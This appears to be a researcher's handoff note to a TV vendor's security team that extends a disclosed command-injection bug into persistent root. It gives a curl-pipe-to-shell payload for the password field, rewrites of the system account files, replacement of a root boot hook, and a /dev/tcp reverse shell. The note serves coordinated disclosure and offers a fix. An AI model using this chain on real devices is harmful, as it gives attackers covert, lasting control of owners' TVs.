# Handoff: persistent root on GQ55Q60TGUXZG / T-NKLDEUC-2743.0

Prepared 2026-10-28 for the Samsung TV Security team.
Supersedes the persistence status in `DISCLOSURE.md`, which was written before
this work. The vulnerability description there is unchanged and still correct.

## What changed since the disclosure

`DISCLOSURE.md` ends at a bounded proof: one `id` command as UID 0. That proof
is unchanged, but it was deliberately weak. Further work took the same sink to a
**persistent root login** on the assessed unit. This note is the delta, not a
replacement.

| Claim | Then | Now |
|---|---|---|
| Root command execution via a credential field | proven | proven (unchanged) |
| Arbitrary script delivery through the same trigger | untested | implemented, offline-proven, not yet run live |
| Owner account creation on the TV | not attempted | implemented, offline-proven |
| Reboot-surviving execution | plausible, static only | implemented via an existing boot consumer, offline-proven, **not yet observed after a reboot on hardware** |
| Root shell | not attempted | implemented as a `/dev/tcp` callback, offline-proven |

## The mechanism, in one paragraph

The password field is evaluated by root `bash -c`, so it can carry
`$(/usr/bin/curl … | /bin/sh)` and run an arbitrary script as root. The script
adds a `$6$`-hashed account to `/etc/passwd` and `/etc/shadow` (ext4 `/`,
so it survives reboot), and replaces `/opt/etc/parseinfo.sh` — which the enabled
`AT-HUB.service` already executes as root at every boot with no `User=`. The
hook is self-healing: it re-creates the account if it is ever removed, writes a
boot-proof marker, and optionally dials a root shell back to the researcher's
host. `/opt` is the persistent data partition, so the hook survives reboot. No
new unit, cron entry, key, or listener is installed; the vendor file is backed
up and `--revert` restores it byte-exactly.

## Relevant findings for Samsung

1. **`AT-HUB.service` runs `/opt/etc/parseinfo.sh` as root with no `User=`, and
   that path is on the writable persistent `/opt` partition.** Together with the
   sink this is a complete reboot-surviving root chain. `/opt` content is
   otherwise treated as data by the boot sequence (`bms.service`
   `EnvironmentFile`, `setcap` units, the joystick udev rule) — all of it root.
2. **`/` is ext4 with `defaults,noatime`** (`/etc/fstab`) and was writable; the
   read-only signed VDFS image is not the only boot-relevant storage.
3. The sink is reachable from three fields (`username`, `password`, `smbpath`),
   and `umount.smb.sh` repeats it for the share name on the disconnect path.
4. Credential length, CIFS `noexec`, and mount failure are all irrelevant to the
   capability: Bash parses the substitution before the mount is attempted.

## What is verified, and how

Offline, on this Mac, in CI-style form:

- 89 unit/contract tests, including the cases that broke earlier revisions
  (vendor files without a trailing newline, `grep` failure while rewriting
  `/etc/passwd`, password changes on re-apply, foreign boot hooks);
- the delivered script executed against a real **busybox `ash`** userland in a
  container (the device is busybox, not GNU);
- a full-shape run: HTTP server → printed payload → the **hash-pinned vendor
  `mount.smb.sh`** → account, 0755 hook with a verbatim hash, markers, silent
  stdout — then the hook executed as the boot consumer would.

`make check` runs all of it and contacts nothing.

## Not verified

- `/opt` writability, SMACK labels, and DAC on the actual unit.
- That `AT-HUB` execs the replacement hook (a label mismatch would fail it
  silently at 126; the script copies the vendor label with `chsmack` when the
  binary exists and logs the outcome).
- Any reboot on hardware. The hook writes `account-ok` / `account-MISSING` /
  `shell=…` into its boot marker so this is decidable from the TV afterwards.
- Versions other than 2743.0, and the first affected / first fixed release.

## Suggested vendor fix

Unchanged from `DISCLOSURE.md`: parse the operation into typed fields and invoke
`/bin/mount` with an argv vector, keeping credentials in a file. On top of that,
give `AT-HUB` a `User=` or verify `/opt/etc/parseinfo.sh` against a vendor hash
before executing it — a boot consumer that runs user-writable content as root is
the persistence boundary regardless of the CIFS bug.

## Rollback

Everything is reversible with one more trigger serving the `--revert` variant:
`serve.py --revert` removes the account and restores the vendor hook from the
`.pre-tiz0wn` backup. The payload, tests, and procedure are in the repository's
`private/persist-root/`. A firmware update overwrites the hook and the account
(they are on the rootfs) and would need one more run.
